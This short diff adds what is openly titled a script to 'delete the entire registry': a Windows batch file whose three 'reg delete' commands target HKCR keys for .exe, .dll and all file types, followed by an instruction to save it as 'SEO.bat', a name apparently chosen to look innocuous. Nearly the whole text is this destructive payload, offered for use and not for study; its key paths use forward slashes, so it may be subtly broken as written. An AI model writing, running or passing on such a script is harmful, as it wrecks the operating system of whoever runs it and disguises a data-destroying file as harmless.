@@ -1,0 +1,10 @@
+Delete the entire registry
+@ECHO OFF
+
+START reg delete HKCR/.exe
+
+START reg delete HKCR/.dll
+
+START reg delete HKCR/*
+
+Now save it as SEO.bat and the batch file is created.
